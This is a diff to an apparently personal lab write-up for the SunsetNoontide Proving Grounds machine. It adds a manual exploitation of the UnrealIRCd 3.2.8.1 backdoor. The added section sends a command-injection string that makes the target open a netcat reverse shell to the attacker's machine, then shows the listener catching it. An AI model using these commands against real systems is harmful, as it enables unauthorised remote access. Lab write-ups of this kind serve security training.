@@ -171,6 +171,7 @@ https://www.exploit-db.com/exploits/13853
 
 https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/master/exploit.py
 
+## Explotation 1
 ```console
 root@kali:/OSCPv3/offsec_pg/SunsetNoontide# python3 exploit.py 192.168.60.120 6667 -payload bash
 Exploit sent successfully!
@@ -186,6 +187,26 @@ server@noontide:~/irc/Unreal3.2$ whoami
 whoami
 server
 ```
+
+## Explotation 2
+```console
+root@kali:/OSCPv3/offsec_pg/SunsetNoontide# nc 192.168.60.120 6667 -vvv
+192.168.60.120: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.60.120] 6667 (ircd) open
+:irc.foonet.com NOTICE AUTH :*** Looking up your hostname...
+AB;:irc.foonet.com NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+  
+:irc.foonet.com 451 AB :You have not registered
+AB;nc 192.168.49.60 80 -e /bin/bash
+```
+```console
+root@kali:/OSCPv3/offsec_pg/SunsetNoontide# nc -lvnp 80
+listening on [any] 80 ...
+connect to [192.168.49.60] from (UNKNOWN) [192.168.60.120] 41050
+whoami
+server
+```
+
 
 ```console
 server@noontide:~/irc/Unreal3.2$ script /dev/null -c bash
